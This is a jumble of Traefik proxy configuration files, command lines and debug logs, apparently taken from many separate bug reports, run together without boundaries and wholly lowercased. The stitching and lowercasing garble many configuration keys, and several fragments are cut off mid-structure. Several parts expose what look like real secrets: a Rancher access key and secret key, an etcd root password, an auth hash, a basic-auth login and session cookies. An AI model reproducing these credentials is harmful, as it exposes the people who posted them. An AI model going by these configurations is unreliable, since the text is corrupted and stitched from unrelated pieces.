":{"prometheus":{"buckets":[0.1,0.3,1.2,5]}},"path":"","auth":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":{"watch":true,"filename":"","constraints":[],"endpoint":"","token":"","certauthfilepath":"","disablepasshostheaders":false,"namespaces":null,"labelselector":"expose=internal"},"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}"
time="2017-08-23t14:00:25z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> compress:false}"
time="2017-08-23t14:00:25z" level=error msg="error creating tls config: tls: failed to find any pem data in key input"
time="2017-08-23t14:00:25z" level=fatal msg="error preparing server: tls: failed to find any pem data in key input"
```
{ "gracetimeout": 10000000000, "debug": false, "checknewversion": true, "accesslogsfile": "", "traefiklogsfile": "", "loglevel": "error", "entrypoints": { "http": { "network": "", "address": ":80", "tls": null, "redirect": { "entrypoint": "https", "regex": "", "replacement": "" }, "auth": null, "compress": false }, "https": { "network": "", "address": ":443", "tls": { "minversion": "", "ciphersuites": null, "certificates": null, "clientcafiles": null }, "redirect": null, "auth": null, "compress": false } }, "cluster": null, "constraints": [], "acme": { "email": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domains": [ { "main": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "sans": null }, { "main": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "sans": null } ], "storage": "", "storagefile": "/acme/acme.json", "ondemand": true, "onhostrule": true, "caserver": "", "entrypoint": "https", "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": false, "tlsconfig": null }, "defaultentrypoints": [ "https", "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 180000000000, "insecureskipverify": false, "retry": null, "healthcheck": { "interval": 30000000000 }, "docker": null, "file": null, "web": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": "/etc/traefik/traefik.toml"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) not applicable
################################################################
## global configuration
################################################################# loglevel = "debug" #[entrypoints]
# [entrypoints.http]
# address = ":80" [web]
address = ":8081" ################################################################
# rancher configuration backend
################################################################
[rancher] # default domain used.
# can be overridden by setting the "traefik.domain" label on an service.
domain = "rancher.novicell.dk" # enable watch rancher changes
# default: true
watch = true # polling interval (in seconds)
refreshseconds = 15 # expose rancher services by default in traefik
# default: true
# # filter services with unhealthy states and health states
# default: false
enableservicehealthfilter = false # endpoint to use when connecting to rancher
endpoint = " " # accesskey to use when connecting to rancher
accesskey = "0af1babcadf09b91ce91" # secretkey to use when connecting to rancher
secretkey = "d6u2eorp7rvugzg8ragxerkeyjam7fbtrs4xflcy"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) version 1.3
[rancher@nc-rancher-ui01 traefik-1.3]$ ./traefik --configfile=traefik.toml
info[2017-08-21t09:43:54+02:00] traefik version v1.3.5 built on 2017-08-01_04:18:59pm
info[2017-08-21t09:43:54+02:00] using toml configuration file /home/rancher/traefik-1.3/traefik.toml
debu[2017-08-21t09:43:54+02:00] global configuration loaded {"gracetimeout":10000000000,"debug":false,"checknewversion":true,"accesslogsfile":"","traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"compress":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"retry":null,"healthcheck":{"interval":30000000000},"docker":null,"file":null,"web":{"address":":8081","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":{"watch":true,"filename":"","constraints":null,"endpoint":" ","accesskey":"0af1babcadf09b91ce91","secretkey":"d6u2eorp7rvugzg8ragxerkeyjam7fbtrs4xflcy","exposedbydefault":false,"domain":"rancher.novicell.dk","refreshseconds":15,"enableservicehealthfilter":false},"dynamodb":null}
info[2017-08-21t09:43:54+02:00] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> compress:false}
info[2017-08-21t09:43:54+02:00] starting provider *server.webprovider {"address":":8081","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null}
info[2017-08-21t09:43:54+02:00] starting provider *rancher.provider {"watch":true,"filename":"","constraints":null,"endpoint":" ","accesskey":"0af1babcadf09b91ce91","secretkey":"d6u2eorp7rvugzg8ragxerkeyjam7fbtrs4xflcy","exposedbydefault":false,"domain":"rancher.novicell.dk","refreshseconds":15,"enableservicehealthfilter":false}
info[2017-08-21t09:43:54+02:00] starting server on :80
erro[2017-08-21t09:43:54+02:00] error creating server: listen tcp :80: bind: permission denied
debu[2017-08-21t09:43:54+02:00] first container len: %!i(int=19)
debu[2017-08-21t09:43:54+02:00] filtering service scheduler/scheduler without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service healthcheck/healthcheck without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service network-services/metadata without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service network-services/network-manager without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service healthcheck/healthcheck without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service network-services/network-manager without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service network-services/metadata without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service scheduler/scheduler without traefik.port label
debu[2017-08-21t09:43:54+02:00] filtering service test/ghost-2 without traefik.port label
debu[2017-08-21t09:43:54+02:00] validation of load balancer method for backend backend-ghot failed: invalid load-balancing method ''
using default method wrr.
debu[2017-08-21t09:43:54+02:00] configuration received from provider rancher: {"backends":{"backend-ghot":{"servers":{"server-0":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-ghost-rancher-novicell-dk":{"entrypoints":["http"],"backend":"backend-ghot","routes":{"route-frontend-host-ghost-rancher-novicell-dk":{"rule":"host:ghost.rancher.novicell.dk"}},"passhostheader":true,"priority":0,"basicauth":[]}}}
debu[2017-08-21t09:43:54+02:00] last rancher config received more than 2s, ok
debu[2017-08-21t09:43:54+02:00] creating frontend frontend-host-ghost-rancher-novicell-dk
debu[2017-08-21t09:43:54+02:00] wiring frontend frontend-host-ghost-rancher-novicell-dk to entrypoint http
debu[2017-08-21t09:43:54+02:00] creating route route-frontend-host-ghost-rancher-novicell-dk host:ghost.rancher.novicell.dk
debu[2017-08-21t09:43:54+02:00] creating backend backend-ghot
debu[2017-08-21t09:43:54+02:00] creating load-balancer wrr
debu[2017-08-21t09:43:54+02:00] creating server server-0 at with weight 0
info[2017-08-21t09:43:54+02:00] server configuration reloaded on :80
^cinfo[2017-08-21t09:43:56+02:00] i have to go..
info[2017-08-21t09:43:56+02:00] stopping server
debu[2017-08-21t09:43:56+02:00] waiting 10s seconds before killing connections on entrypoint http...
debu[2017-08-21t09:43:56+02:00] entrypoint http closed
info[2017-08-21t09:43:56+02:00] server stopped
info[2017-08-21t09:43:56+02:00] shutting down
``` on master
info[2017-08-21t10:04:27+02:00] starting server on :80
debu[2017-08-21t10:04:27+02:00] configuration received from provider rancher: {}
debu[2017-08-21t10:04:27+02:00] last rancher config received more than 2s, ok
info[2017-08-21t10:04:27+02:00] server configuration reloaded on :80
^cinfo[2017-08-21t10:04:36+02:00] i have to go..
info[2017-08-21t10:04:36+02:00] stopping server
debu[2017-08-21t10:04:36+02:00] waiting 10s seconds before killing connections on entrypoint http...
debu[2017-08-21t10:04:36+02:00] entrypoint http closed
info[2017-08-21t10:04:36+02:00] server stopped
info[2017-08-21t10:04:36+02:00] shutting down
erro[2017-08-21t10:04:36+02:00] error creating server: http: server closed
#loglevel = "debug"
#loglevel = "info"
#loglevel = "warn" defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [web]
address = ":8080" [consul]
endpoint = "127.0.0.1:8500"
watch = true
prefix = "traefik" [acme]
email = "hostmaster@removed.net"
storage = "traefik/acme/account"
entrypoint = "https"
ondemand = true
acmelogging = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch)
unable to get debug output, if i restart traefik, the certificate renews, but this happened every 3 months
these logs are repeated: ```{ "log": "2017/08/22 08:28:28 server.go:2317: http: tls handshake error from 138.201.47.186:35312: remote error: tls: unknown certificate\ ", "stream": "stderr", "time": "2017-08-22t08:28:28.093810763z"
{ "log": "time=\\"2017-08-22t08:28:45z\\" level=debug msg=\\"challenge getcertificate removed.net\\" \ ", "stream": "stderr", "time": "2017-08-22t08:28:45.707229073z"
{ "log": "time=\\"2017-08-22t08:28:45z\\" level=debug msg=\\"acme got domain cert removed.net\\" \ ", "stream": "stderr", "time": "2017-08-22t08:28:45.707284615z"
``` and after updating 1.3.5, it's still providing the old certificate and not renewing
time="2017-08-22t08:34:35z" level=debug msg="look for provided certificate to validate [removed.net]..."
time="2017-08-22t08:34:35z" level=debug msg="no provided certificate found for domains [removed.net], get acme certificate."
time="2017-08-22t08:34:35z" level=debug msg="challenge getcertificate removed.net"
time="2017-08-22t08:34:35z" level=debug msg="acme got domain cert removed.net"
debug = true
defaultentrypoints = ["http"]
accesslogsfile = "log/access.log" [entrypoints] [entrypoints.http] address = ":80" [web]
address = ":8080" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "anansi.local"
watch = true
exposedbydefault = false
usebindportip = false
swarmmode = false [web.auth.digest]
users = ["thibault:traefik:ad96f8d862d1b4c7790bfbef2d0dccbe"] [etcd]
endpoint = "bootstrap.domain.io:23800"
watch = true
username = "root"
password = "123456"
prefix = "/traefik" [etcd.tls]
ca = "/users/zero/downloads/2017/star.ca-bundle"
cert = "/users/zero/downloads/2017/star.crt-bundle"
key = "/users/zero/downloads/2017/star.key"
insecureskipverify = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
#> ./traefik_darwin-amd64 storeconfig -c ~/downloads/traefik.conf --debug
2017/08/20 09:53:42 storing configuration: {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","traefiklogsfile":"","loglevel":"error","entrypoints":{"http":{"network":"","address":":8080","tls":null,"redirect":null,"auth":null,"compress":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"retry":null,"healthcheck":{"interval":30000000000},"docker":{"watch":true,"filename":"","constraints":null,"endpoint":"unix:///var/run/docker.sock","domain":"anansi.local","tls":null,"exposedbydefault":false,"usebindportip":false,"swarmmode":false},"file":null,"web":{"address":":8081","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":{"basic":null,"digest":{"users":["thibault:traefik:ad96f8d862d1b4c7790bfbef2d0dccbe"],"usersfile":""},"headerfield":""}},"marathon":null,"consul":null,"consulcatalog":null,"etcd":{"watch":true,"filename":"","constraints":[],"endpoint":"bootstrap.domain.io:23800","prefix":"/traefik","tls":{"ca":"/users/zero/downloads/2017/star.ca-bundle","cert":"/users/zero/downloads/2017/star.crt-bundle","key":"/users/zero/downloads/2017/star.key","insecureskipverify":true},"username":"root","password":"123456"},"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}
2017/08/20 09:50:35 error running traefik: client: etcd cluster is unavailable or misconfigured
``` here a screenshot of insomnia rest client to show that etcd api is working: <img width="483" alt="screen shot 2017-08-20 at 09 59 02" src=" ">
[entrypoints] [entrypoints.http] address = ":80" [file] [frontends] [frontends.website] backend = "website" entrypoints = ["http"] [backends] [backends.website] [backends.website.servers.website] url = " "
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
debu[2017-08-17t15:48:34+08:00] round trip: code: 301, duration: 1.229961ms
running in docker
my toml: ```toml
traefiklogsfile = "/var/log/traefik/traefik.log"
accesslogsfile = "/var/log//traefik/access.log"
loglevel = "debug" defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "example.com"
watch = true
exposedbydefault = false
swarmmode = true [web]
address = ":8080" [web.auth.basic] users = ["admin:thisisnotmypassword"]
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) nothing special in logs.
ubuntu 17 ```toml
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] defaultentrypoints = ["http", "https"]
entrypoint = "https"
watch = true [backends.b_mf] [backends.b_mf.servers.server1] url = " " weight = 10 [frontends.f_mf] entrypoints = ["http","https"] priority = 108 passhostheader = true backend = "b_mf" [frontends.f_mf.routes.test_1] rule = "path:/f_mf" ``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-08-13t09:30:52z" level=debug msg="round trip: code: 200, duration: 1.837673ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:...
using docker swarm on ubuntu 17 ```toml
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme]
entrypoint = "https"
ondemand = true
watch = true [backends.b_socket] [backends.b_socket.servers.server1] url = " " weight = 10 [frontends.f_socket1] entrypoints = ["http","https"] priority = 8 passhostheader = true backend = "b_socket" [frontends.f_socket1.routes.test_1] rule = "headers:connection, upgrade" [frontends.f_socket2] entrypoints = ["http","https"] priority = 8 passhostheader = true backend = "b_socket" [frontends.f_socket2.routes.test_1] rule = "headers:upgrade, websocket" [frontends.f_socket0] entrypoints = ["http","https"] priority = 8 passhostheader = true backend = "b_socket" [frontends.f_socket0.routes.test_1] rule = "path:/socket.io" # few other rules based on path ``` ### if applicable, please paste the log output in debug mode (`--debug` switch)
time="2017-08-10t08:37:38z" level=debug msg="round trip: code: 404, duration: 1.775782ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:xxx.com" time="2017-08-10t08:37:40z" level=debug msg="round trip: code: 404, duration: 2.754365ms tls:version: 303, tls:resume:true, tls:csuite:c02f, tls:server:xxx.com" ```
this is my `traefik.toml`
there is a simple application running listening to and responding with a 200 response
loglevel = "debug"
defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":8080" [file] [frontends] [frontends.frontend1] backend = "backend1" [frontends.frontend1.routes.test_1] rule = "path:/ok" [backends] [backends.backend1] [backends.backend1.servers.server1] url = " " [backends.backend1.servers.server2] url = " " [accesslog]
format="json"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
info[2017-08-09t10:23:20+02:00] traefik version dev built on i don\'t remember exactly info[2017-08-09t10:23:20+02:00] using toml configuration file /users/mjantke/work/go/src/github.com/marco-jantke/go-playground/sticky/traefik.toml debu[2017-08-09t10:23:20+02:00] global configuration loaded {"gracetimeout":10000000000,"debug":false,"checknewversion":true,"accesslogsfile":"","accesslog":{"format":"json"},"traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":8080","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"docker":null,"file":{"watch":true,"filename":"/users/mjantke/work/go/src/github.com/marco-jantke/go-playground/sticky/traefik.toml","constraints":null,"trace":false,"directory":""},"web":{"address":":8000","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":{"prometheus":{"buckets":[0.1,0.3,1.2,5]},"datadog":null,"statsd":null},"path":"","auth":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null} debu[2017-08-09t10:23:20+02:00] configured prometheus metrics info[2017-08-09t10:23:20+02:00] preparing server http &{network: address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false} info[2017-08-09t10:23:20+02:00] starting provider *file.provider {"watch":true,"filename":"/users/mjantke/work/go/src/github.com/marco-jantke/go-playground/sticky/traefik.toml","constraints":null,"trace":false,"directory":""} info[2017-08-09t10:23:20+02:00] starting provider *server.webprovider {"address":":8000","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":{"prometheus":{"buckets":[0.1,0.3,1.2,5]},"datadog":null,"statsd":null},"path":"","auth":null} info[2017-08-09t10:23:20+02:00] starting server on :8080 debu[2017-08-09t10:23:20+02:00] validation of load balancer method for backend backend1 failed: invalid load-balancing method \'\'
using default method wrr
debu[2017-08-09t10:23:20+02:00] configuration received from provider file: {"backends":{"backend1":{"servers":{"server1":{"url":" ","weight":0},"server2":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr","sticky":true}}},"frontends":{"frontend1":{"entrypoints":["http"],"backend":"backend1","routes":{"test_1":{"rule":"path:/ok"}},"priority":0,"basicauth":null,"headers":{}}}} debu[2017-08-09t10:23:20+02:00] last file config received more than 2s, ok debu[2017-08-09t10:23:20+02:00] creating frontend frontend1 debu[2017-08-09t10:23:20+02:00] wiring frontend frontend1 to entrypoint http debu[2017-08-09t10:23:20+02:00] creating route test_1 path:/ok debu[2017-08-09t10:23:20+02:00] creating backend backend1 debu[2017-08-09t10:23:20+02:00] creating load-balancer wrr debu[2017-08-09t10:23:20+02:00] sticky session with cookie _traefik_backend_backend1 debu[2017-08-09t10:23:20+02:00] creating server server1 at with weight 0 debu[2017-08-09t10:23:20+02:00] creating server server2 at with weight 0 debu[2017-08-09t10:23:20+02:00] configured prometheus metrics info[2017-08-09t10:23:20+02:00] server configuration reloaded on :8080 {"clientaddr":"[::1]:59190","clienthost":"::1","clientport":"59190","clientusername":"-","downstreamcontentsize":21,"downstreamstatus":500,"downstreamstatusline":"500 internal server error","duration":136627,"overhead":136627,"requestaddr":"localhost:8080","requestcontentsize":0,"requestcount":1,"requesthost":"localhost","requestline":"get /ok http/1.1","requestmethod":"get","requestpath":"/ok","requestport":"8080","requestprotocol":"http/1.1","startlocal":"2017-08-09t10:23:21.343124269+02:00","startutc":"2017-08-09t08:23:21.343124269z","level":"info","msg":"","request_accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","request_accept-encoding":"gzip, deflate, br","request_accept-language":"en-gb,en;q=0.8,en-us;q=0.6,de;q=0.4","request_cache-control":"max-age=0","request_connection":"keep-alive","request_upgrade-insecure-requests":"1","request_user-agent":"mozilla/5.0 (macintosh; intel mac os x 10_12_5) applewebkit/537.36 (khtml, like gecko) chrome/60.0.3112.90 safari/537.36","time":"2017-08-09t10:23:21+02:00"}
docker service create \\ --name traefik \\ --network consul \\ --network frontend \\ --mode global \\ --constraint "node.role==manager" \\ --update-delay 10s \\ --update-parallelism 1 \\ --update-failure-action continue \\ --restart-condition on-failure \\ --restart-delay 5s \\ --restart-max-attempts 3 \\ --restart-window 120s \\ --publish 80:80 \\ --publish 443:443 \\ --publish 8080:8080 \\ --mount "type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock" \\ traefik \\ --docker \\ --docker.swarmmode \\ --docker.domain="*stripped*" \\ --docker.watch \\ --web \\ --web.statistics \\ --consul \\ --consul.endpoint="consul:8500"
traefik/accesslogsfile:
traefik/acme/:
traefik/acme/account/lock:f0cc7e58-7303-4cb5-9f17-2d0018e9255a
traefik/acme/account/object:*stripped*
traefik/acme/acmelogging:true
traefik/acme/caserver:
traefik/acme/delaydontcheckdns:0
traefik/acme/dnsprovider:
traefik/acme/email:*stripped*
traefik/acme/entrypoint:https
traefik/acme/ondemand:true
traefik/acme/onhostrule:false
traefik/acme/storage:traefik/acme/account
traefik/checknewversion:true
traefik/cluster/:
traefik/cluster/node:
traefik/consul/:
traefik/consul/endpoint:consul:8500
traefik/consul/filename:
traefik/consul/password:
traefik/consul/prefix:traefik
traefik/consul/username:
traefik/consul/watch:true
traefik/debug:false
traefik/defaultentrypoints/0:http
traefik/docker/:
traefik/docker/domain:*stripped*
traefik/docker/endpoint:unix:///var/run/docker.sock
traefik/docker/exposedbydefault:true
traefik/docker/filename:
traefik/docker/swarmmode:true
traefik/docker/usebindportip:false
traefik/docker/watch:true
traefik/entrypoints/http/:
traefik/entrypoints/http/address::80
traefik/entrypoints/http/compress:false
traefik/entrypoints/http/network:
traefik/entrypoints/https/:
traefik/entrypoints/https/address::443
traefik/entrypoints/https/compress:false
traefik/entrypoints/https/network:
traefik/entrypoints/https/tls/:
traefik/entrypoints/https/tls/minversion:
traefik/gracetimeout:10000000000
traefik/healthcheck/:
traefik/healthcheck/interval:30000000000
traefik/idletimeout:180000000000
traefik/insecureskipverify:false
traefik/leader:
traefik/loglevel:error
traefik/maxidleconnsperhost:200
traefik/providersthrottleduration:2000000000
traefik/traefiklogsfile:
traefik/web/:
traefik/web/address::8080
traefik/web/certfile:
traefik/web/keyfile:
traefik/web/path:
traefik/web/readonly:false
traefik/web/statistics/:
traefik/web/statistics/recenterrors:10
``` there is no trace of the failed request in the logs (in debug mode)
defaultentrypoints = ["http"]
loglevel = "warn"
maxidleconnsperhost = 1000 [entrypoints] [entrypoints.http] address = ":80" compress = true
loglevel="debug" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/run/secrets/site_certificate.crt" keyfile = "/run/secrets/site_certificate.key" [acme]
email = "#########"
storage = "/etc/traefik/acme/acme.json"
ondemand = false
onhostrule = true
entrypoint = "https"
dnsprovider = "cloudflare"
``` example swarm label config:
``` labels: - "traefik.frontend.entrypoints=http,https" - "traefik.port=80" - "traefik.frontend.rule=host:#######" - "traefik.docker.network=australia-swarm_lb-network" - "traefik.backend.loadbalancer.sticky=true"
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = "10.1.1.30:80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [frontends] [frontends.test1] backend = "test1" passhostheader = true [frontends.test1.routes.default] rule = "host:test1.example.com" [backends] [backends.test1] [backends.test1.healthcheck] path = "/healthcheck" [backends.test1.loadbalancer] method = "drr" [backends.test1.servers.controller1] url = " " [backends.test1.servers.controller2] url = " "
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
{ "gracetimeout": 10000000000, "debug": false, "checknewversion": true, "accesslogsfile": "", "traefiklogsfile": "", "loglevel": "error", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 180000000000, "insecureskipverify": false, "retry": null, "healthcheck": { "interval": 30000000000 }, "docker": null, "file": null, "web": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": ""
``` docker-compose example
{ "version": "3", "services": { "traefik": { "image": "nexus.cegedim-next.net:5001/traefik:1.3.3-alpine", "ports": [ "80:80", "8080:8080" ], "volumes": [ "/var/run/docker.sock:/var/run/docker.sock" ], "command": "--docker --docker.swarmmode --docker.watch --web --retry.attempts=2", "deploy": { "mode": "global" } }, "dashing": { "image": "johnzan/dashing", "deploy": { "labels": { "traefik.enable": "true", "traefik.backend": "dashing", "traefik.frontend.rule": "pathprefixstrip:/dashing", "traefik.port": "3030" } } } }
docker in a photon vm on esxi 5.5
` version: 1.13.1 api version: 1.26 (minimum version 1.12) go version: go1.8.1 git commit: 092cba3 built: fri may 5 02:08:33 2017 os/arch: linux/amd64
docker run -d --name="home-assistant" \\ --restart=always \\ -v $pwd/config:/config \\ -v /etc/localtime:/etc/localtime:ro \\ --network=traefik-net \\ -p 8123:8123 \\ --label traefik.port=8123 \\ --label traefik.docker.network=traefik-net \\ homeassistant/home-assistant
``` ```toml
debug = true
loglevel = "debug" defaultentrypoints = ["http", "https", "ws", "wss"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] insecureskipverify = true #..
acme and some manual backends ..
endpoint = "unix:///var/run/docker.sock"
domain = "docker.int.xxx.com"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-07-08t01:58:18z" level=debug msg="writing outgoing websocket request to target connection: &{method:get url:ws:/api/websocket proto:http/1.1 protomajor:1 protominor:1 header:map[cache-control:[no-cache] connection:[upgrade] user-agent:[mozilla/5.0 (macintosh; intel mac os x 10_11_6) applewebkit/537.36 (khtml, like gecko) chrome/59.0.3071.115 safari/537.36] accept-language:[en-us,en;q=0.8] sec-websocket-version:[13] cookie:[__zlcmid=eqgbjgivtncb4a; _ga=ga1.2.930888288.1496028630] sec-websocket-extensions:[permessage-deflate; client_max_window_bits] accept-encoding:[gzip, deflate] origin:[ upgrade:[websocket] sec-websocket-key:[fszu8u+pr9iqdac3xzyivq==] pragma:[no-cache]] body:{} getbody:<nil> contentlength:0 transferencoding:[] close:false host:home-assistant.docker.int.xxx.com form:map[] postform:map[] multipartform:<nil> trailer:map[] remoteaddr:192.168.2.1:49364 requesturi:/api/websocket tls:<nil> cancel:<nil> response:<nil> ctx: }"
traefik: ports: - 8000:8080/tcp - 80:80/tcp - 443:443/tcp labels: io.rancher.scheduler.global: \'true\' io.rancher.scheduler.affinity:host_label: role=traefik io.rancher.scheduler.affinity:container_label_ne: io.rancher.stack_service.name=$${stack_name}/$${service_name} image: containous/traefik:779eeba650b1bd9a9228cf17da7ed4ba02ed93c9 command: - "--web" - "--entrypoints=name:http\\ address::80\\ redirect.entrypoint:https" - "--entrypoints=name:https\\ address::443\\ tls" - "--defaultentrypoints=http,https" - "--rancher" - "--rancher.exposedbydefault=false" - "--rancher.metadata=true" - "--acme" - "--acme.email=email@domain.com" - "--acme.storage=/mnt/acme.json" - "--acme.entrypoint=https" - "--acme.ondemand=true" - "--loglevel=info" volumes: - "traefik_acme:/mnt:nocopy" ```
every traefik backend container has the following rancher labels: labels: traefik.port: 8080 traefik.enable: true traefik.frontend.rule: "host:www.domain.com,domain.com" traefik.acme.domains: "www.domain.com,domain.com"
``` --docker \\ --docker.swarmmode=true \\ --docker.exposedbydefault=false \\ --docker.watch=true \\ --docker.domain=example.com \\ --web
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
here is my traefik.toml conf:
defaultentrypoints = ["http", "https", "ws", "wss"] [web]
address = ":8080" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect]
entrypoint = "https" [entrypoints.https] address = ":443"
[entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/server.crt" keyfile = "/ssl/server.key" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "example.com"
watch = true
exposedbydefault = false
``` and docker side, here is my service container conf:
``` - "traefik.network=app-network" - "traefik.protocol=http" - "traefik.frontend.entrypoints=https" - "traefik.port=9000" - "traefik.backend=app-main" - "traefik.frontend.rule=host:app-main.docker.localhost" - "traefik.frontend.rule=pathprefix:/,/logo,/avatars,/internal/users/findbyemail,/internal/users,/wsapp" #(i think when / is specified the other paths are useless?)
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
time="2017-07-06t15:33:12z" level=debug msg="writing outgoing websocket request to target connection: &{method:get url:ws:/wsapp/129/mcmpg5fu/websocket proto:http/1.1 protomajor:1 protominor:1 header:map[sec-websocket-extensions:[permessage-deflate; client_max_window_bits] sec-websocket-version:[13] sec-websocket-key:[zsg8z67b9agpsqrzpnd9uw==] connection:[upgrade] accept-language:[fr-fr,fr;q=0.8,en-us;q=0.6,en;q=0.4] upgrade:[websocket] cookie:[session=a8849fb7-84fe-40a1-a124-7f064cd93422] cache-control:[no-cache] pragma:[no-cache] user-agent:[mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/59.0.3071.115 safari/537.36] accept-encoding:[gzip, deflate, br] origin:[ body:{} getbody:<nil> contentlength:0 transferencoding:[] close:false host:192.168.99.100 form:map[] postform:map[] multipartform:<nil> trailer:map[] remoteaddr:192.168.99.1:60832 requesturi:/wsapp/129/mcmpg5fu/websocket tls: cancel:<nil> response:<nil> ctx: }"
time="2017-07-06t15:33:12z" level=debug msg="switching protocol failed" ``` i read no special configuration is required to make websocket working, so i couldn\' find any doc on the subject but i can\'t deal with it...
we run it inside k8s 1.6.6 no toml file used
this is the k8s yaml file: <details> ```yml
apiversion: v1
kind: serviceaccount
metadata: name: traefik-ingress-controller namespace: kube-system
kind: clusterrole
apiversion: rbac.authorization.k8s.io/v1beta1
metadata: name: traefik-ingress-controller
rules: - apigroups: - "" resources: - pods - services - endpoints verbs: - get - list - watch - apigroups: - extensions resources: - ingresses verbs: - get - list - watch
kind: clusterrolebinding
apiversion: rbac.authorization.k8s.io/v1beta1
metadata: name: traefik-ingress-controller
roleref: apigroup: rbac.authorization.k8s.io kind: clusterrole name: traefik-ingress-controller
- kind: serviceaccount name: traefik-ingress-controller namespace: kube-system
kind: deployment
apiversion: extensions/v1beta1
metadata: name: traefik-ingress-controller namespace: kube-system labels: k8s-app: traefik-ingress-lb
